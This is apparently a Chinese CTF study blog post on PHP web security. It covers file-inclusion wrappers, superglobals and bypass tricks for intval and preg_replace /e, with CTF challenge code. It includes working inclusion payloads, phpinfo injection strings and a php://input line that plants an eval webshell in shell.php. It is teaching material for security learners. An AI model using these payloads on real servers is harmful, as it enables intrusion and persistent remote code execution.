<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>PHP-杂七杂八 | 为了即将到来的那一刻(那一天)</title><meta name="keywords" content="基础,Web安全,CTF"><meta name="author" content="Nik41d0"><meta name="copyright" content="Nik41d0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP伪协议-文件包含漏洞​	PHP伪协议是 PHP支持的协议 与 封装协议，使用条件：具有文件包含的函数，如 include()、require()、include_once()、require_once() ​	PHP中有很多函数可以查看源码：highlight_file()  、show_source()、readfile() file_get_contents()（无回显，需要手动输出）">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP-杂七杂八">
<meta property="og:url" content="http://example.com/2022/11/21/002&102%E2%80%94PHP(%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB)/index.html">
<meta property="og:site_name" content="为了即将到来的那一刻(那一天)">
<meta property="og:description" content="PHP伪协议-文件包含漏洞​	PHP伪协议是 PHP支持的协议 与 封装协议，使用条件：具有文件包含的函数，如 include()、require()、include_once()、require_once() ​	PHP中有很多函数可以查看源码：highlight_file()  、show_source()、readfile() file_get_contents()（无回显，需要手动输出）">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/007.jpg">
<meta property="article:published_time" content="2022-11-21T14:17:28.000Z">
<meta property="article:modified_time" content="2023-02-19T08:26:00.623Z">
<meta property="article:author" content="Nik41d0">
<meta property="article:tag" content="基础">
<meta property="article:tag" content="Web安全">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/007.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/11/21/002&amp;102%E2%80%94PHP(%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/Nik41d0" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
  copy: {
    success: '宣告！你的剪切板已被吾占领',
    error: '哎呀，讨厌啦~~~',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PHP-杂七杂八',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-19 16:26:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.staticaly.com/gh/Nikaid0/Imge/main/background/007.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">为了即将到来的那一刻(那一天)</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PHP-杂七杂八</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-21T14:17:28.000Z" title="发表于 2022-11-21 22:17:28">2022-11-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-19T08:26:00.623Z" title="更新于 2023-02-19 16:26:00">2023-02-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%94%BB%E4%BD%93/">锻体</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>32分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PHP-杂七杂八"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PHP伪协议-文件包含漏洞"><a href="#PHP伪协议-文件包含漏洞" class="headerlink" title="PHP伪协议-文件包含漏洞"></a>PHP伪协议-文件包含漏洞</h1><p>​	PHP伪协议是 PHP支持的协议 与 封装协议，使用条件：具有文件包含的函数，如 include()、require()、include_once()、require_once()</p>
<p>​	PHP中有很多函数可以查看源码：<code>highlight_file()</code>  、<code>show_source()</code>、<code>readfile()</code> <code>file_get_contents()</code>（无回显，需要手动输出）</p>
<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><p>​	用来读取本地文件，不受 <code>php.ini</code> 配置文件中 <code>allow_url_fopen</code>，<code>allow_url_include</code> 的限制</p>
<blockquote>
<p>用法：&#x2F;?file&#x3D;file:&#x2F;&#x2F;文件的绝对路径+文件名</p>
</blockquote>
<p>​	如果要读取的是 <code>.php</code> 文件时，代码会自动执行而看到不到源码(与下面的php:&#x2F;&#x2F;filter一样，要看源码的话只能先编码了)。<del>第一个 file 是定义的变量，不一定都是 file</del></p>
<h2 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><blockquote>
<p>仅php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory 和 php:&#x2F;&#x2F;temp 需要开启allow_url_include</p>
</blockquote>
<p>​	访问各个输入&#x2F;输出流，在CTF中用 php:&#x2F;&#x2F;filter读取源码，php:&#x2F;&#x2F;input执行php代码</p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><strong>php:&#x2F;&#x2F;filter</strong></h3><p>​	访问本地文件的协议，读取源码时要进行base64编码，不然会被当做 php 代码执行而看不到源码</p>
<blockquote>
<p>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
</blockquote>
<ol>
<li>php:&#x2F;&#x2F;filter&#x2F;:格式</li>
<li>read:可选参数，有 read write 也可以不写</li>
<li>convert.base64-encode:可选，转换过滤器</li>
<li>&#x2F;resource&#x3D;：必选，后面加目标文件名</li>
</ol>
<p>过滤器:字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。使用多个过滤器时用 | 分割开</p>
<table>
<thead>
<tr>
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>等同于 str_rot13()，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于 strtoupper()，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于 strtolower()，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于 strip_tags()，去除字符串中HTML、XML、PHP的语言标签</td>
</tr>
</tbody></table>
<p><strong>转换过滤器</strong></p>
<p>​	convert.base64-encode：base64编码，convert.base64-decode：  base64解码</p>
<p>​	convert.quoted-printable-encode：Quoted-printable编码，convert.quoted-printable-decode：解码</p>
<p><strong>加密过滤器</strong></p>
<p>​	<code>mcrypt.*</code>：libmcrypt 对称加密算法，<code>mdecrypt.*</code>：libmcrypt 对称解密算法</p>
<p><strong>[ACTF2020 新生赛]Include：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-01.jpg"></p>
<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h3><p>​	条件：开启allow_url_include、同样源码中要有 文件包含 的函数</p>
<blockquote>
<p>用法：&#x2F;?file&#x3D;php:&#x2F;&#x2F;input，之后在用 POST的方式输入 代码</p>
</blockquote>
<p>​	可以访问请求原始数据的只读流，将 POST 请求的数据当作php代码执行。将参数设为 php:&#x2F;&#x2F;input，同时用 POST 方式输入想要执行的代码，从而导致任意代码的执行</p>
<p>利用 php:&#x2F;&#x2F;input 可以写入 PHP一句话木马，在 POST 中传入如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><blockquote>
<p>方法：&#x2F;?file&#x3D;zip:&#x2F;&#x2F;压缩文件绝对路径 %23 压缩包内的文件名</p>
</blockquote>
<p>可以访问 压缩包 里面的文件，当与包含函数结合时，zip:&#x2F;&#x2F; 流会被当作 PHP 执行，从而实现任意代码执行</p>
<ul>
<li>压缩文件的后缀名可以任意修改，只要是压缩包即可(如果.zip无法上传，可以上传.jpg)</li>
<li>%23 为 # 的URL编码，因为在 GET 请求中会 忽略 # 后面的参数</li>
<li>相同类型：zlib:&#x2F;&#x2F;、bzip2:&#x2F;&#x2F;</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-02.jpg"></p>
<h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><blockquote>
<p>条件：allow_url_fopen、allow_url_include 都为 On</p>
</blockquote>
<p>用法：&#x2F;?file&#x3D;data:&#x2F;&#x2F; [MIME-TYPE] [;charset&#x3D;encoding] [;base64], 想要执行的代码</p>
<p>​	类似于 php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的<code>data://</code>流会被当作php文件执行，从而导致任意代码执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,</span></span><br><span class="line">	/?file=data:<span class="comment">//,&lt;?php phpinfo()?&gt;</span></span><br><span class="line">	/?file=data:<span class="comment">//text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line">    /?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-03.png"></p>
<p>**phar:&#x2F;&#x2F;**：与 zip:&#x2F;&#x2F; 类似，可以导致 任意代码的执行，用法一样</p>
<h2 id="file-get-contents-绕过"><a href="#file-get-contents-绕过" class="headerlink" title="file_get_contents 绕过"></a><strong>file_get_contents 绕过</strong></h2><p>​	file_get_contents()：把整个文件读入一个 字符串中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">isset</span>(<span class="variable">$a</span>))&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;congratulation!&#125;&#x27;</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	可以用 php:&#x2F;&#x2F;input得到原始的POST数据，访问请求的原始数据的只读流。将 POST 请求中的数据作为PHP代码执行来进行绕过；还可以用 data:&#x2F;&#x2F; 来控制输入流</p>
<ul>
<li><p>将 <code>flag</code> 这个字符串 用POST的方式传进去(当然还要用&#x2F;?a&#x3D;php:&#x2F;&#x2F;input)</p>
</li>
<li><p>还可以用 <code>/?a=data://text/plain,flag</code></p>
</li>
</ul>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>​	我们用 <code>$</code> + 变量名(当然名字需要合法) 来表示变量</p>
<ul>
<li><p><strong>全局变量</strong>：在所有函数外定义的变量，拥有 <strong>全局</strong> 作用域</p>
</li>
<li><p><strong>局部变量</strong>：仅在一个函数内部定义的变量，只有 <strong>局部</strong> 作用域</p>
</li>
<li><p><strong>超级全局变量</strong>：PHP中预定义了一些数组变量，可以在任何位置访问（同时拥有 局部和全局 作用域）</p>
</li>
</ul>
<p>​	在一个函数中是无法访问 <strong>全局变量</strong>的(除非声明变量为 global )，同样在一个函数中定义的<strong>局部变量</strong> <u>函数外</u> 也无法访问，也就是说在不同函数内可以使用相同的变量名(都是局部变量)</p>
<p>以下是一些超级全局变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span></span><br><span class="line"><span class="variable">$_SERVER</span>:一个包含了头信息、路径、以及脚本位置等信息的数组</span><br><span class="line"><span class="variable">$_REQUEST</span>:默认情况下包含了 <span class="variable">$_GET</span> <span class="variable">$_POST</span> <span class="variable">$_SESSION</span>的数组</span><br><span class="line"><span class="variable">$_GET</span>:收集HTML表单数据</span><br><span class="line"><span class="variable">$_POST</span>:同上，但更安全</span><br><span class="line"><span class="variable">$_SESSION</span>:用于记住用户的状态 和 他想要在整个会话中检索的值</span><br><span class="line"><span class="variable">$_COOKIE</span>:通过 HTTP Cookies方式传递给当前脚本的变量的数组</span><br><span class="line"><span class="variable">$_FILES</span>:通过 POST 方法向服务器上传的数据的有关信息的数组</span><br><span class="line"><span class="variable">$_ENV</span></span><br></pre></td></tr></table></figure>

<p>以下是 $_SERVER 的一些元素：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>$_SERVER[‘PHP_SELF’]</td>
<td>当前正在执行的脚本 文件名</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADDR’]</td>
<td>主机服务器的IP地址</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_NAME’]</td>
<td>主机服务器名</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PORT’]</td>
<td>Web 服务器使用的端口</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_FILENAME’]</td>
<td>当前执行脚本的绝对路径</td>
</tr>
<tr>
<td>$_SERVER[ ‘HTTP_USER_AGENT’ ]</td>
<td>客户端的用户代理</td>
</tr>
</tbody></table>
<p>​	$_REQUEST 变量可用来收集通过 GET 和 POST 方法发送的表单信息，但不常用(有安全问题)</p>
<p>​	$_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值，可以在URL中直接看到，变量的值有限制</p>
<p>​	$_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。用 POST 方法发送的表单信息，对任何人都是不可见的（不会显示在URL中，更安全），且发送信息的量也没有限制</p>
<blockquote>
<p>$_SESSION 数组变量用于存储来自任何页面的值，并在其他页面中检索它们，而不是在URL中传递它们。</p>
</blockquote>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p><strong>eval、assert、call_user_func</strong></p>
<ol>
<li><p>eval()：将一段合法的 PHP 字符串当作代码执行（须以 <code>;</code> 结尾，函数调用除外）</p>
</li>
<li><p>assert()：判断一个表达式是否成立，可以把 整个字符串 当做 PHP 代码执行(类似于eval)</p>
</li>
<li><p>call_user_func()：将第一个参数作为回调函数调用（将第一个参数作为函数）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//命令拼接</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 执行定义好的函数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)   </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>); 	<span class="comment">//输出 111222</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="intval-比较绕过"><a href="#intval-比较绕过" class="headerlink" title="intval()比较绕过"></a><strong>intval()比较绕过</strong></h2><blockquote>
<p>适用版本：php7.0以下</p>
</blockquote>
<p>如果参数是科学计数法的字符串，会以e前面的数字作为返回值；而对于科学计数法+数字则会返回其本来的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[WUSTCTF2020]朴实无华-level1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	可用利用科学计数法绕过：<strong>num&#x3D;1e10</strong>，但后面的数字不能太大，因为返回值的范围有限</p>
<h2 id="preg-replace-x2F-e模式"><a href="#preg-replace-x2F-e模式" class="headerlink" title="preg_replace() &#x2F;e模式"></a><strong>preg_replace() &#x2F;e模式</strong></h2><blockquote>
<p>preg_replace($pattern , $replacement , $subject)<br>            $pattern：要搜索的模式，可以是字符串或一个字符串数组<br>            $replacement：用于替换的字符串或字符串数组<br>            $subject：目标字符串或字符串数组</p>
<p>&#x2F;e 修正符使 preg_replace() 将 $replacement 参数当作 PHP 代码，但$replacement 必须能构成一个合法的 PHP 代码字符串</p>
</blockquote>
<p><strong>[BJDCTF2020]ZJCTF，不过如此</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>&#x2F;e模式：相当于执行了 <code>strtolower(&quot;\\1&quot;)</code>，<code>\\1</code> 也就是 \1，正则表达式中表示 指定第一个子匹配项</p>
</li>
<li><p>$_GET as $re &#x3D;&gt; $str：动态赋值，将GET请求中的 参数名 作为 键$re，参数对应的值 作为键值$str</p>
</li>
</ul>
<p>​	官方payload：&#x2F;?.*&#x3D;{${phpinfo()}}（GET方式传入的参数名为 <code>?.*</code> ，值为 {${phpinfo()}} ）</p>
